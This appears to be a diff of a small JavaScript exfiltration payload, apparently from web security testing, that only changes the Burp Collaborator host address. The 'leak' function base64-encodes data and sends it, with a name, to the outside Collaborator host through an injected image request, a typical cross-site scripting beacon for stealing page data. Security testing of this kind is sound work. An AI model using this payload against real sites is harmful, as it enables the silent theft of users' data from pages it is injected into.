@@ -1,7 +1,7 @@
 leak = function(name, data)
 {
    var i = document.createElement('img');
-   i.src = "https://3676nv4yy7gt4c0979zitrv3zu5wtl.burpcollaborator.net/leak?" + name + "=" + btoa(data);
+   i.src = "https://xdeboownyvwcflmmm31nogswbnhd52.burpcollaborator.net/leak?" + name + "=" + btoa(data);
    document.body.appendChild(i); 
 }
 
